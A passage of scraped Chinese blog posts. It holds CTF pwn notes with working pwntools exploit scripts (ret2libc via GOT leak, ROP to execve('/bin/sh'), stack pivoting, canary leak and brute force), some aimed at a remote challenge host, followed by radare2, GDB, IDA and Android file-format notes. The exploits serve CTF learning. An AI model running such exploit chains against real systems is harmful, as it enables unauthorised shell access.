eg3:\nret2libc3\n2的基础上去掉了system的地址。\ngot 表泄露libc的函数地址\n利用思路：\n泄露 __libc_start_main 地址\n获取 libc 版本\n获取 system 地址与 /bin/sh 的地址\n再次执行源程序\n触发栈溢出执行 system(‘/bin/sh’)\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import LibcSearcher context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(\u0026#39;./ret2libc3\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10008) elf = ELF(\u0026#39;./ret2libc3\u0026#39;) puts_plt = elf.plt[\u0026#39;puts\u0026#39;] start_main_got = elf.got[\u0026#39;__libc_start_main\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] payload = flat([\u0026#34;A\u0026#34;*112,puts_plt,main,start_main_got]) io.sendlineafter(\u0026#34;Can you find it !?\u0026#34;,payload) libc_start_main_addr = u32(io.recv()[0:4]) libc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;,libc_start_main_addr) libcbase = libc_start_main_addr-libc.dump(\u0026#34;__libc_start_main\u0026#34;) sym_addr = libcbase+libc.dump(\u0026#39;system\u0026#39;) binsh_addr = libcbase+libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = flat([\u0026#34;A\u0026#34;*112,sym_addr,\u0026#34;bbbb\u0026#34;,binsh_addr]) io.sendline(payload) io.interactive() 中级ROP ret2csu 利用 x64 下的 __libc_csu_init 中的 gadgets.\neg:level5:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #undef _FORTIFY_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void vulnerable_function() { char buf[128]; read(STDIN_FILENO, buf, 512); } int main(int argc, char** argv) { write(STDOUT_FILENO, \u0026#34;Hello, World\\n\u0026#34;, 13); vulnerable_function(); } exp:\nret2reg 略 无题目 BROP 略 无二进制 高级ROP ret2_dl_runtime_resolve XDCTF2015-pwn200\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void vuln() { char buf[100]; setbuf(stdin, buf); read(0, buf, 256); } int main() { char buf[100] = \u0026#34;Welcome to XDCTF2015~!\\n\u0026#34;; setbuf(stdout, buf); write(1, buf, strlen(buf)); vuln(); return 0; } //gcc -o bof -m32 -fno-stack-protector bof.c SROP ret2VDSO 花式栈溢出 stack pivoting X-CTF Quals 2016 - b0verfl0w\n转移堆：EkoPartyCTF 2016 fuckzing-exploit-200\nframe faking 2018 安恒杯 over\n直接EXP 分析，，困扰了很久的exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from pwn import * context.binary = \u0026#34;./over.over\u0026#34; def DEBUG(cmd): raw_input(\u0026#34;DEBUG: \u0026#34;) gdb.attach(io, cmd) io = process(\u0026#34;./over.over\u0026#34;) elf = ELF(\u0026#34;./over.over\u0026#34;) libc = elf.libc io.sendafter(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;a\u0026#39; * 80) stack = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - 0x70 success(\u0026#34;stack -\u0026gt; {:#x}\u0026#34;.format(stack)) # DEBUG(\u0026#34;b *0x4006B9\\nc\u0026#34;) 96 io.sendafter(\u0026#34;\u0026gt;\u0026#34;, flat([\u0026#39;11111111\u0026#39;, 0x400793, elf.got[\u0026#39;puts\u0026#39;], elf.plt[\u0026#39;puts\u0026#39;], 0x400676, (80 - 40) * \u0026#39;1\u0026#39;, stack, 0x4006be])) libc.address = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6: ].ljust(8, \u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc.address -\u0026gt; {:#x}\u0026#34;.format(libc.address)) pop_rdi_ret=0x400793 \u0026#39;\u0026#39;\u0026#39; $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026#34;pop|ret\u0026#34; 0x00000000000f5279 : pop rdx ; pop rsi ; ret \u0026#39;\u0026#39;\u0026#39; pop_rdx_pop_rsi_ret=libc.address+0xf5279 payload=flat([\u0026#39;22222222\u0026#39;, pop_rdi_ret, next(libc.search(\u0026#34;/bin/sh\u0026#34;)),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym[\u0026#39;execve\u0026#39;], (80 - 7*8 ) * \u0026#39;2\u0026#39;, stack - 0x30, 0x4006be]) io.sendafter(\u0026#34;\u0026gt;\u0026#34;, payload) io.interactive() Stack smash 35c3 CTF readme\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from pwn import * addr_ow_flag = 0x600d20 addr_flag = 0x400d20 H,P = \u0026#39;localhost\u0026#39;, 6666 #r = process(\u0026#39;./readme.bin\u0026#39;) r = remote(H,P) junk = r.recvuntil(\u0026#34;What\u0026#39;s your name? \u0026#34;) exploit = \u0026#34;A\u0026#34;*0x218 exploit += p64(addr_flag) exploit += p64(0) exploit += p64(addr_ow_flag) r.sendline(exploit) junk += r.recvuntil(\u0026#34;Please overwrite the flag: \u0026#34;) exploit = \u0026#34;LIBC_FATAL_STDERR_=1\u0026#34; r.sendline(exploit) junk += r.recvall() print junk 栈上partial overwrite 2018 安恒杯 babypie\n2018 XNUCA-gets\nCanary 绕过技术 泄露栈中的Canary\n覆盖 Canary 的低字节，来打印出剩余的 Canary 部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // ex2.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void getshell(void) { system(\u0026#34;/bin/sh\u0026#34;); } void init() { setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); } void vuln() { char buf[100]; for(int i=0;i\u0026lt;2;i++){ read(0, buf, 0x200); printf(buf); } } int main(void) { init(); puts(\u0026#34;Hello Hacker!\u0026#34;); vuln(); return 0; } EXP\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/env python from pwn import * context.binary = \u0026#39;ex2\u0026#39;#全局系统自动设置，为官方推荐设置，ex2为文件名称。 #context.log_level = \u0026#39;debug\u0026#39;#debug模式下才开启 io = process(\u0026#39;./ex2\u0026#39;) #本地连接到ex2 get_shell = ELF(\u0026#34;./ex2\u0026#34;).sym[\u0026#34;getshell\u0026#34;] #由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。 io.recvuntil(\u0026#34;Hello Hacker!\\n\u0026#34;)#接受传来的第一部分字符 # leak Canary payload = \u0026#34;A\u0026#34;*100 io.sendline(payload) #传输100个A io.recvuntil(\u0026#34;A\u0026#34;*100) Canary = u32(io.recv(4))-0xa #因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a log.info(\u0026#34;Canary:\u0026#34;+hex(Canary))#日志记录下canary # Bypass Canary payload = \u0026#34;\\x90\u0026#34;*100+p32(Canary)+\u0026#34;\\x90\u0026#34;*12+p32(get_shell)#发送最后的payload io.send(payload) io.recv() io.interactive() one-by-one 爆破 Canary\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 print \u0026#34;[+] Brute forcing stack canary \u0026#34; start = len(p) stop = len(p)+8 while len(p) \u0026lt; stop: for i in xrange(0,256): res = send2server(p + chr(i)) if res != \u0026#34;\u0026#34;: p = p + chr(i) #print \u0026#34;\\t[+] Byte found 0x%02x\u0026#34; % i break if i == 255: print \u0026#34;[-] Exploit failed\u0026#34; sys.exit(-1) canary = p[stop:start-1:-1].encode(\u0026#34;hex\u0026#34;) print \u0026#34; [+] SSP value is 0x%s\u0026#34; % canary劫持__stack_chk_fail 函数\n覆盖 TLS 中储存的 Canary 值\n","date":"2019-02-20T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/","title":"CTF-PWN刷题记录-CTFWiki_1栈溢出"},{"content":"radare2+cutter使用指南 0x00 介绍 radare2 一个很实用的二进制分析和调试工具\ncutter 是r2的GUI版。\n0x01 安装 支持的平台有如下：\nWindows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.\nLinux平台下直接\n1 git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh) Windows下可以下载二进制安装包安装。官网下载\nWindows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。\n0x03 工具介绍 r2常用的包含有一下组件：\nrax2 用于数值转换\nrasm2 反汇编和汇编\nrabin2 查看文件格式\nradiff2 对文件进行 diff\nragg2/ragg2­cc 开发shellcode工具\nrahash2 各种密码算法， hash算法\nradare2 整合了所有工具\n使用帮助直接-h\nrax2 rasm2 rabin2 eg: (-I)\nradiff2 ragg2/ragg2­cc rahash2 radare2 (最常用) 可缩写为r2 0x04 r2 实战学习 challenge来源于：http://reversing.kr\n先查看一下文件信息：\nGUI?:\n用r2载入，自动分析aaa命令：\nvv 命令查看界面：\n注意0x00401080 调用了GetDlgItemTextA\ns 调到main函数，查看main的汇编代码：\npdc查看伪代码：\n大写的VV命令查看图形界面 使用hijk来进行界面移动。\n看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。\n看到GetDlgTemTextA调用：\n函数调用\n差不多逻辑就是一直比对字符串，从第二位开始比最后第一位\n得到Ea5yR3versing\n命令记不住或者想知道有些什么命令可以用就可以加个？号查询\n0x05 Cutter的使用 多图待补 Radare2 Book\n","date":"2019-01-02T00:00:00+08:00","permalink":"https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"radare2+cutter使用指南"},{"content":"PWN_小tools的使用 GCC 编译常用命令 不带选项 gcc test.c 将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。 -o 指定生成的输出文件； gcc test.c -o test 将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。 -E 仅执行编译预处理； gcc -E test.c -o test.i 将test.c预处理输出test.i文件。 -S 将C代码转换为汇编代码； gcc -S test.i 将预处理输出文件test.i汇编成test.s文件。 -c 仅执行编译操作，不进行连接操作。 gcc -c test.s 将汇编输出文件test.s编译输出test.o文件。 -wall 显示警告信息； **无选项链接** gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。 -O 使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长 gcc -O1 test.c -o test 关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.c 关掉Stack Protector/Canary（栈保护） gcc -fno-stack-protector -o level level.c 关掉程序ASLR/PIE（程序随机化保护） gcc -no-pie level level.c 64位linux下面的GCC编译出一个32位可执行程序 gcc -m32 -z execstack -fno-stack-protector -o level level.c GDB常用调试命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 gcc -g main.c //在目标文件加入源代码的信息 gdb a.out (gdb) start //开始调试 (gdb) n //一条一条执行 (gdb) step/s //执行下一条，如果函数进入函数 (gdb) backtrace/bt //查看函数调用栈帧 (gdb) info/i locals //查看当前栈帧局部变量 (gdb) frame/f //选择栈帧，再查看局部变量 (gdb) print/p //打印变量的值 (gdb) finish //运行到当前函数返回 (gdb) set var sum=0 //修改变量值 (gdb) list/l 行号或函数名 //列出源码 (gdb) display/undisplay sum //每次停下显示变量的值/取消跟踪 (gdb) break/b 行号或函数名 //设置断点 (gdb) continue/c //连续运行 (gdb) info/i breakpoints //查看已经设置的断点 (gdb) delete breakpoints 2 //删除某个断点 (gdb) disable/enable breakpoints 3 //禁用/启用某个断点 (gdb) break 9 if sum != 0 //满足条件才激活断点 (gdb) run/r //重新从程序开头连续执行 (gdb) watch input[4] //设置观察点 (gdb) info/i watchpoints //查看设置的观察点 (gdb) x/7b input //打印存储器内容，b--每个字节一组，7--7组 (gdb) disassemble //反汇编当前函数或指定函数 (gdb) si // 一条指令一条指令调试 而 s 是一行一行代码 (gdb) info registers // 显示所有寄存器的当前值 (gdb) x/20 $esp //查看内存中开始的20个数 ni 单步执行不进入 si 单步执行并进入 disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 checksec 查看elf编译的保护选项。 查壳 upx -d file\nobjjump objdump是二进制文件快速查看工具。 常用命令：\n1. `objdump -d [file]` 查看文件的所有汇编代码 1. `objdump -f [file]` 查看文件的每个文件的整体头部摘要 ####python\npython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | ./file python以命令方式执行并把结果传递给filepython -c \u0026ldquo;\u0026hellip;\u0026rdquo; | xargs ./file python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。os.system() 创建一个子进程os.putenv(\u0026ldquo;name\u0026rdquo;, \u0026ldquo;value\u0026rdquo;) 添加一个环境变量\npwntools 参考 http://pwntools.readthedocs.io/en/stable/ （官网介绍）\n[http://brieflyx.me/2015/python-module/pwntools-intro/](http://brieflyx.me/2015/python-module/pwntools-intro/) [http://brieflyx.me/2015/python-module/pwntools-advanced/](http://brieflyx.me/2015/python-module/pwntools-advanced/) 一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。\n常用的模块有下面几个： - ==asm==:汇编与反汇编 - ==dynelf==:用于远程符号泄露，需要提供leak方法 - ==elf==:对elf文件进行操作 - ==gdb==:配合gdb进行调试 - ==memleak==:用于内存泄漏 - ==shellcraft==: shellcode的生成器 - ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE - ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等 pwndbg arena 堆检查\nmp 显示堆\nbins,fastbins,unsorted,smallbins,largebins\nheap\ntop_chunk\nprocinfo 查看当前进程状态\nrop rop --grep \u0026quot;pop rdi\u0026quot; -- --nojop --nosys --depth 2\nsearch search -s “/bin/sh”\nvvmap 虚拟内存映射\ntelescope 检查内存转储\n","date":"2018-10-22T00:00:00+08:00","permalink":"https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"PWN_小tools的使用"},{"content":"IDA_动态调试.so_基本步骤 IDA 动态调试.so 基本步骤 待补图 0x00 IDA快捷键 Shirt+F12 字符串窗口\nF5大法好 反汇编\nCtrl+S 查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）\nG 快速跳转到对应地址。s\n调试-F7单步进入调试、F8单步、F9运行\n0x01 方法一 获取运行Android_server。\nandroid_server文件放在IDA安装目录下的注意版本的不同。\n之后只需 push android_server /data/local/tmp/。\n之后adb shell，su ，cd /data/local/tmp/。\n可能还得chmod 755 android_server 才有权限运行。\n建立通信、attach进程。\nadb forward tcp:23946 tcp:23946命令。\n在IDA的Debugger选项中attach进程。\n加载so、找函数下断点\n双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。\n0x02 方法二 无法加载so文件需要在加载之前断点。反调试之类\nDebug方式启动app。需要应用可调试开启\nadb shell am start -D -n 包名/.MainActivity\n方法一的1，2两步 勾选选项。\njdb attach程序\njdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n开始调试 同上\n","date":"2018-08-31T00:00:00+08:00","permalink":"https://ykiko.top/p/ida_%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so_%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/","title":"IDA_动态调试.so_基本步骤"},{"content":"Android应用安全防护和逆向分析-基础篇5-6 一、 基础篇⑤-⑥ 这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。\n第五章 AndroidManifest.xml格式解析 AndroidManifest.xml\nAndroidManifest.xml文件格式图\n头部信息 文件魔数：4bytes。\n文件大小：4bytes。\nChunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。\nSting Chunk ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。\nChunkType：类型，固定4bytes（0x001C001)。\nChunkSize：大小，4bytes。\nStringCount：字符串的个数 ，4bytes。\nStyleCount ：样式的个数，4bytes。\nUnknown ：位置区域。4bytes。\nStringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。\nStylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。\nStringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。\nStyleOffsets：每个样式的偏移值，大小为StyleChunk*4。\n如何读取这个文件？\nResourceld Chunk ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID\nChunkType：类型，固定4bytes（0x00080108）。\nChunkSize：大小，4bytes。\nResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。\n解析？\nStart Namespace Chunk：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。\nChunk Type：类型，固定4bytes。（0x00100100)。\nChunk Size：大小，4bytes。\nLine Number ：AndroidMaifest文件中行号，4bytes。\nUnknown：未知区域,4bytes。\nPrefix：命名空间的前缀（在字符串中的索引值），eg:android。\nUri：命名空间的URI（在字符串中的索引值），eg:http://schemas.android.com/apk/res/android\nStart Tag Chunk：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。\nChunk Type：类型，固定4bytes。（0x00100102)。\nChunk Size：大小，4bytes。\nLine Number ：对应AndroidMaifest中的行号，4bytes。\nUnknown：未知区域,4bytes。\nNamespace Uri ：命名空间的Uri，4bytes。\nName：标签名称（在字符串中的索引值），4bytes。\nFlags：标签的类型，4bytes。eg：是开始标签还是结束标签？\nAttributes Counk：便签中包含的属性的个数，4bytes。\nClass Attribute：标签包含的类属性，4bytes。\nAttributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4\u0026quot;个字节。\nAXMLPrinter工具 aapt 工具 第六章 resourec.arsc文件格式解析 资源文件id格式 resourec.arsc文件格式\n数据结构 上图\n头部信息\nresourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class ResChunkHeader{ public short type; //当前chunk的类型 public short headerSize; //当前chunk的头部大小 public int size; //当前chunk的大小 public int getHeaderSize(){ return 2+2+4 } @Override public String toString(){ return \u0026#34;type:\u0026#34;+Utils.bytesToHexString( Utils.int2Byte(type))+\u0026#34;,headerSize:\u0026#34;+headerSize+\u0026#34;,size:\u0026#34;+size; } } 资源索引表的头部信息\nresourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class ResTableHeader { public ResChunkHeader header; //就是标准的Chunk头部信息格式 public int packageCount; //被编译的资源包的个数 public ResTableHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;packageCount:\u0026#34;+packageCount; } } 资源项的值字符串资源池接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。\n包含了所有在资源包里面定义的资源项的值字符串，结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class ResStringPoolHeader { public ResChunkHeader header; //标准的Chunk头部信息结构 public int stringCount; //字符串的个数 public int styleCount; //字符串样式的个数 public final static int SORTED_FLAG = 1; public final static int UTF8_FLAG = (1\u0026lt;\u0026lt;8); public int flags; //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值 public int stringsStart; //字符串内容块相对于其头部的距离 public int stylesStart; //字符串样式块相对于其头部的距离 public ResStringPoolHeader(){ header = new ResChunkHeader(); } public int getHeaderSize(){ return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34; + \u0026#34;stringCount:\u0026#34;+stringCount+\u0026#34;,styleCount:\u0026#34;+styleCount+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,stringStart:\u0026#34;+stringsStart+\u0026#34;,stylesStart:\u0026#34;+stylesStart; } } 字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：\nlen = (((hbyte \u0026amp; 0x7F) \u0026lt;\u0026lt; 8)) | lbyte;\n如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。\nPackage数据块\n这个数据块记录编译包的元数据，头部信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTablePackage { public ResChunkHeader header; //Chunk的头部信息数据结构 public int id; //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01； public char[] name = new char[128]; //包名 public int typeStrings; //类型字符串资源池相对头部的偏移 public int lastPublicType; //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途 public int keyStrings; //资源项名称字符串相对头部的偏移 public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途 public ResTablePackage(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;\\n\u0026#34;+\u0026#34;,id=\u0026#34;+id+\u0026#34;,name:\u0026#34;+name.toString()+\u0026#34;,typeStrings:\u0026#34;+typeStrings+\u0026#34;,lastPublicType:\u0026#34;+lastPublicType+\u0026#34;,keyStrings:\u0026#34;+keyStrings+\u0026#34;,lastPublicKey:\u0026#34;+lastPublicKey; } } 类型规范数据块\n用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableTypeSpec { public final static int SPEC_PUBLIC = 0x40000000; public ResChunkHeader header; //Chunk的头部信息结构 public byte id; //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。 public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public ResTableTypeSpec(){ header = new ResChunkHeader(); } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount; } } 资源类型项数据块\n描述资源项的具体信息，名称、值、配置等信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class ResTableType { public ResChunkHeader header; //Chunk的头部信息结构 public final static int NO_ENTRY = 0xFFFFFFFF; public byte id; //标识资源的Type ID public byte res0; //保留,始终为0 public short res1; //保留,始终为0 public int entryCount; //等于本类型的资源项个数,指名称相同的资源项的个数。 public int entriesStart; //等于资源项数据块相对头部的偏移值。 public ResTableConfig resConfig; //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等 public ResTableType(){ header = new ResChunkHeader(); resConfig = new ResTableConfig(); } public int getSize(){ return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4; } @Override public String toString(){ return \u0026#34;header:\u0026#34;+header.toString()+\u0026#34;,id:\u0026#34;+id+\u0026#34;,res0:\u0026#34;+res0+\u0026#34;,res1:\u0026#34;+res1+\u0026#34;,entryCount:\u0026#34;+entryCount+\u0026#34;,entriesStart:\u0026#34;+entriesStart; } } ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class ResTableEntry { public final static int FLAG_COMPLEX = 0x0001; public final static int FLAG_PUBLIC = 0x0002; public short size; public short flags; public ResStringPoolRef key; public ResTableEntry(){ key = new ResStringPoolRef(); } public int getSize(){ return 2+2+key.getSize(); } @Override public String toString(){ return \u0026#34;size:\u0026#34;+size+\u0026#34;,flags:\u0026#34;+flags+\u0026#34;,key:\u0026#34;+key.toString()+\u0026#34;,str:\u0026#34;+ParseResourceUtils.getKeyString(key.index); } } ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class ResTableMapEntry extends ResTableEntry{ public ResTableRef parent; public int count; public ResTableMapEntry(){ parent = new ResTableRef(); } @Override public int getSize(){ return super.getSize() + parent.getSize() + 4; } @Override public String toString(){ return super.toString() + \u0026#34;,parent:\u0026#34;+parent.toString()+\u0026#34;,count:\u0026#34;+count; } } ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package com.wjdiankong.parseresource.type; /** struct ResTable_map { //bag资源项ID ResTable_ref name; //bag资源项值 Res_value value; }; * @author i * */ public class ResTableMap { public ResTableRef name; public ResValue value; public ResTableMap(){ name = new ResTableRef(); value = new ResValue(); } public int getSize(){ return name.getSize() + value.getSize(); } @Override public String toString(){ return name.toString()+\u0026#34;,value:\u0026#34;+value.toString(); } } 如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 public class ResValue { //dataType字段使用的常量 public final static int TYPE_NULL = 0x00; public final static int TYPE_REFERENCE = 0x01; public final static int TYPE_ATTRIBUTE = 0x02; public final static int TYPE_STRING = 0x03; public final static int TYPE_FLOAT = 0x04; public final static int TYPE_DIMENSION = 0x05; public final static int TYPE_FRACTION = 0x06; public final static int TYPE_FIRST_INT = 0x10; public final static int TYPE_INT_DEC = 0x10; public final static int TYPE_INT_HEX = 0x11; public final static int TYPE_INT_BOOLEAN = 0x12; public final static int TYPE_FIRST_COLOR_INT = 0x1c; public final static int TYPE_INT_COLOR_ARGB8 = 0x1c; public final static int TYPE_INT_COLOR_RGB8 = 0x1d; public final static int TYPE_INT_COLOR_ARGB4 = 0x1e; public final static int TYPE_INT_COLOR_RGB4 = 0x1f; public final static int TYPE_LAST_COLOR_INT = 0x1f; public final static int TYPE_LAST_INT = 0x1f; public static final int COMPLEX_UNIT_PX\t=0, COMPLEX_UNIT_DIP\t=1, COMPLEX_UNIT_SP\t=2, COMPLEX_UNIT_PT\t=3, COMPLEX_UNIT_IN\t=4, COMPLEX_UNIT_MM\t=5, COMPLEX_UNIT_SHIFT\t=0, COMPLEX_UNIT_MASK\t=15, COMPLEX_UNIT_FRACTION\t=0, COMPLEX_UNIT_FRACTION_PARENT=1, COMPLEX_RADIX_23p0\t=0, COMPLEX_RADIX_16p7\t=1, COMPLEX_RADIX_8p15\t=2, COMPLEX_RADIX_0p23\t=3, COMPLEX_RADIX_SHIFT\t=4, COMPLEX_RADIX_MASK\t=3, COMPLEX_MANTISSA_SHIFT\t=8, COMPLEX_MANTISSA_MASK\t=0xFFFFFF; public short size; //ResValue的头部大小 public byte res0; //保留，始终为0 public byte dataType; //数据的类型,可以从上面的枚举类型中获取 public int data; //数据对应的索引 public int getSize(){ return 2 + 1 + 1 + 4; } public String getTypeStr(){ switch(dataType){ case TYPE_NULL: return \u0026#34;TYPE_NULL\u0026#34;; case TYPE_REFERENCE: return \u0026#34;TYPE_REFERENCE\u0026#34;; case TYPE_ATTRIBUTE: return \u0026#34;TYPE_ATTRIBUTE\u0026#34;; case TYPE_STRING: return \u0026#34;TYPE_STRING\u0026#34;; case TYPE_FLOAT: return \u0026#34;TYPE_FLOAT\u0026#34;; case TYPE_DIMENSION: return \u0026#34;TYPE_DIMENSION\u0026#34;; case 